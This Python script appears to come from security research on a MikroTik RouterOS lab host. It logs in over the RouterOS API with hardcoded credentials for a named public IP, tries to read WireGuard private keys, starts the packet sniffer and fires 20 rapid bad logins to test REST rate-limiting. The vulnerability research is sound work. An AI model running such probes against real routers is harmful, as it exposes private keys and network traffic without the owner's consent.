# Original: laboratory/bug-hunt/mikrotik/test_findings.py
# Source: mrhenrike | SafeLabs security research

"""
Test script: MIKROTIK-CONFIG-001 (WireGuard key) & MIKROTIK-CONFIG-002 (Sniffer)
Target: 167.71.20.188 (authorized SafeLabs CHR lab)
Author: André Henrique (@mrhenrike)
"""

import socket
import logging
import json
from datetime import datetime

logging.basicConfig(level=logging.WARNING)

TARGET = "167.71.20.188"
PORT = 8728

CREDENTIALS = [
    ("admin",         "C0C0D3GR120",    "full (baseline)"),
    ("administrator", "covid#19@mata",  "unknown group"),
    ("user",          "user1!",         "unknown group"),
    ("info",          "%1q2w@3e4r%",    "unknown group"),
    ("adm",           "ro48br48",       "unknown group"),
    ("manager",       "sexy%%baby",     "unknown group"),
]

# ─── RouterOS API binary protocol ─────────────────────────────────────────────

def ros_encode_len(n):
    if n < 0x80:
        return bytes([n])
    elif n < 0x4000:
        return bytes([(n >> 8) | 0x80, n & 0xFF])
    elif n < 0x200000:
        return bytes([(n >> 16) | 0xC0, (n >> 8) & 0xFF, n & 0xFF])
    else:
        return bytes([(n >> 24) | 0xE0, (n >> 16) & 0xFF, (n >> 8) & 0xFF, n & 0xFF])

def ros_encode_sentence(*words):
    out = b""
    for w in words:
        b = w.encode("utf-8")
        out += ros_encode_len(len(b)) + b
    return out + b"\x00"


class RosAPI:
    """Minimal RouterOS binary API client."""

    def __init__(self, host, port=8728, timeout=10):
        self.s = socket.create_connection((host, port), timeout=timeout)

    def close(self):
        try:
            self.s.close()
        except Exception:
            pass

    def login(self, user, pwd):
        self.s.sendall(ros_encode_sentence("/login", f"=name={user}", f"=password={pwd}"))
        resp = self._read_sentence()
        if resp and resp[0] == b"!done":
            return True
        return False

    def cmd(self, *words):
        self.s.sendall(ros_encode_sentence(*words))
        results = []
        while True:
            sentence = self._read_sentence()
            if not sentence:
                break
            tag = sentence[0]
            attrs = {}
            for w in sentence[1:]:
                if b"=" in w[1:]:
                    k, v = w[1:].split(b"=", 1)
                    attrs[k.decode(errors="replace")] = v.decode(errors="replace")
            if tag == b"!re":
                results.append(attrs)
            elif tag in (b"!done", b"!trap", b"!fatal"):
                if attrs:
                    results.append({"__tag__": tag.decode(), **attrs})
                break
        return results

    def _read_sentence(self):
        words = []
        while True:
            w = self._read_word()
            if w == b"":
                return words
        return words

    def _read_word(self):
        n = self._read_len()
        if n == 0:
            return b""
        data = b""
        while len(data) < n:
            chunk = self.s.recv(n - len(data))
            if not chunk:
                break
            data += chunk
        return data

    def _read_len(self):
        b = self.s.recv(1)
        if not b:
            return 0
        c = b[0]
        if c < 0x80:
            return c
        elif c < 0xC0:
            return ((c & 0x3F) << 8) | self.s.recv(1)[0]
        elif c < 0xE0:
            b2 = self.s.recv(2)
            return ((c & 0x1F) << 16) | (b2[0] << 8) | b2[1]
        else:
            b3 = self.s.recv(3)
            return ((c & 0x0F) << 24) | (b3[0] << 16) | (b3[1] << 8) | b3[2]


# ─── Test functions ───────────────────────────────────────────────────────────

def test_user_group(api):
    """Check which group the logged-in user belongs to."""
    r = api.cmd("/user/print", "=.proplist=name,group")
    return r

def test_wireguard_key(api):
    """
    MIKROTIK-CONFIG-001: Attempt to read WireGuard private key.
    Returns (success, private_key_or_error).
    """
    r = api.cmd("/interface/wireguard/print")
    if not r:
        return False, "No WireGuard interfaces or access denied"
    for iface in r:
        if "__tag__" in iface:
            return False, f"Error: {iface}"
        name = iface.get("name", "?")
        priv_key = iface.get("private-key", None)
        pub_key = iface.get("public-key", None)
        if priv_key and priv_key != "":
            return True, f"iface={name} private-key={priv_key[:20]}... public-key={pub_key}"
        elif pub_key:
            return False, f"iface={name} public-key={pub_key} (private key hidden)"
    return False, f"WireGuard interface found but no private key visible: {r}"

def test_sniffer_read(api):
    """
    MIKROTIK-CONFIG-002: Attempt to read sniffer settings and start it.
    Returns (can_read_settings, can_start, details).
    """
    # Step 1: read sniffer settings
    r_settings = api.cmd("/tool/sniffer/print")
    can_read = bool(r_settings and "__tag__" not in r_settings[0])

    # Step 2: try to start sniffer (then immediately stop it)
    r_start = api.cmd("/tool/sniffer/start")
    can_start = any("__tag__" not in d for d in r_start) if r_start else False
    # Stop it immediately if started
    if can_start:
        api.cmd("/tool/sniffer/stop")

    return can_read, can_start, r_settings

def test_sensitive_policy(api):
    """Check if current user can read sensitive info (API password policy)."""
    r = api.cmd("/user/group/print")
    return r

def test_rest_api_ratelimit():
    """
    Test if REST API (HTTP) also lacks rate-limiting.
    Makes 20 rapid auth attempts and checks for 429 or lockout.
    """
    import http.client
    import base64
    results = []
    for i in range(20):
        try:
            conn = http.client.HTTPConnection(TARGET, 80, timeout=5)
            creds = base64.b64encode(b"wronguser:wrongpass").decode()
            conn.request("GET", "/rest/system/resource",
                         headers={"Authorization": f"Basic {creds}"})
            resp = conn.getresponse()
            results.append(resp.status)
            conn.close()
        except Exception as e:
            results.append(f"ERR:{e}")
    rate_limited = any(str(s) == "429" for s in results)
    return results, rate_limited


# ─── Main ─────────────────────────────────────────────────────────────────────

def main():
    print("=" * 72)
    print(f"  MIKROTIK-CONFIG-001 & -002 — Privilege Test")
    print(f"  Target: {TARGET}:{PORT}  |  {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print("=" * 72)

    findings = []

    for username, password, note in CREDENTIALS:
        print(f"\n{'─'*60}")
        print(f"  USER: {username}  ({note})")
        print(f"{'─'*60}")

        result = {
            "user": username,
            "group": None,
            "wg_key_visible": False,
            "wg_key_value": None,
            "sniffer_read": False,
            "sniffer_start": False,
            "error": None,
        }

        try:
            api = RosAPI(TARGET, PORT, timeout=8)
            logged = api.login(username, password)

            if not logged:
                print(f"  [-] LOGIN FAILED")
                result["error"] = "login failed"
                api.close()
                findings.append(result)
                continue

            print(f"  [+] LOGIN OK")

            # Check user group/policy
            groups = test_sensitive_policy(api)
            if groups:
                for g in groups:
                    if "__tag__" not in g:
                        print(f"  [i] Group: name={g.get('name','?')}  policy={g.get('policy','?')}")
            result["group"] = groups

            # Test MIKROTIK-CONFIG-001: WireGuard private key
            wg_ok, wg_detail = test_wireguard_key(api)
            result["wg_key_visible"] = wg_ok
            result["wg_key_value"] = wg_detail
            if wg_ok:
                print(f"  [!!!] CONFIG-001 VULNERABLE: WireGuard private key READABLE")
                print(f"        {wg_detail}")
            else:
                print(f"  [OK]  CONFIG-001: WireGuard key NOT readable → {wg_detail}")

            # Test MIKROTIK-CONFIG-002: Packet sniffer
            sn_read, sn_start, sn_detail = test_sniffer_read(api)
            result["sniffer_read"] = sn_read
            result["sniffer_start"] = sn_start
            if sn_start:
                print(f"  [!!!] CONFIG-002 VULNERABLE: Sniffer can be STARTED by {username}")
            elif sn_read:
                print(f"  [!!]  CONFIG-002 PARTIAL: Sniffer settings readable by {username}")
            else:
                print(f"  [OK]  CONFIG-002: Sniffer NOT accessible → {sn_detail}")

            api.close()

        except Exception as e:
            print(f"  [ERROR] {e}")
            result["error"] = str(e)

        findings.append(result)

    # ── REST API rate-limit test ──────────────────────────────────────────────
    print(f"\n{'─'*60}")
    print("  REST API (HTTP :80) — Rate-Limiting Test (20 rapid attempts)")
    print(f"{'─'*60}")
    statuses, rate_limited = test_rest_api_ratelimit()
    codes = {}
    for s in statuses:
        codes[str(s)] = codes.get(str(s), 0) + 1
    print(f"  Response codes: {codes}")
    if rate_limited:
        print("  [OK]  REST API returns 429 Too Many Requests → rate-limiting PRESENT")
    else:
        print("  [!!!] REST API: NO 429 detected after 20 attempts → VULNERABLE (no rate-limiting)")

    # ── Summary ──────────────────────────────────────────────────────────────
    print(f"\n{'='*72}")
    print("  SUMMARY")
    print(f"{'='*72}")
    vuln_wg = [f["user"] for f in findings if f["wg_key_visible"]]
    vuln_sn = [f["user"] for f in findings if f["sniffer_start"]]
    partial_sn = [f["user"] for f in findings if f["sniffer_read"] and not f["sniffer_start"]]

    print(f"  CONFIG-001 (WireGuard key visible)  : {vuln_wg if vuln_wg else 'NONE — not vulnerable'}")
    print(f"  CONFIG-002 (Sniffer can start)      : {vuln_sn if vuln_sn else 'NONE — not vulnerable'}")
    print(f"  CONFIG-002 (Sniffer settings read)  : {partial_sn if partial_sn else 'NONE'}")
    print(f"  REST rate-limiting                   : {'ABSENT (VULNERABLE)' if not rate_limited else 'PRESENT (OK)'}")

    if not vuln_wg and not vuln_sn and not rate_limited:
        print("\n  → Config-001/002 require admin group. REST API rate-limiting ABSENT.")
        print("    REST API finding may be a separate CVE candidate.")
    elif vuln_wg or vuln_sn:
        print("\n  → CRITICAL: Non-admin users can read private keys / start sniffer.")
        print("    NEW CVE candidates: CONFIG-001 and/or CONFIG-002.")

    print()
    # Save findings
    with open("D:\\Projetos-SafeLabs\\laboratory\\bug-hunt\\mikrotik\\findings\\config001-002-test-results.json", "w") as f:
        json.dump({
            "target": TARGET,
            "date": datetime.now().isoformat(),
            "rest_rate_limited": rate_limited,
            "rest_status_codes": codes,
            "per_user": findings
        }, f, indent=2, default=str)
    print("  Results saved to: findings/config001-002-test-results.json")


if __name__ == "__main__":
    main()
